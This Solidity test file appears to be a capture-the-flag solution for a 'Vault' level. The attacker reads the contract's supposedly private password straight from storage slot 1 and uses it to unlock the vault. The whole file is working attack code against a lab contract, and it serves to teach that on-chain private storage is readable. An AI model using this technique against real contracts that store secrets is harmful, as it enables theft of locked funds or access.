// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../Attack.sol";
import "./Vault.sol";

contract VaultAttack is Attack {
  Vault private _vault;

  function setUp() public {
    vm.prank(owner);
    bytes32 password = "A very strong secret password :)";
    _vault = new Vault(password);
  }

  function test_attack() public {
    vm.startPrank(attacker);

    bytes32 password = vm.load(address(_vault), bytes32(uint256(1)));

    _vault.unlock(password);

    /*** Validation ***/
    assertFinished(address(_vault));
  }

  function validateInstance(address payable _instance, address) override public view returns (bool) {
    Vault instance = Vault(_instance);
    return !instance.locked();
  }
}
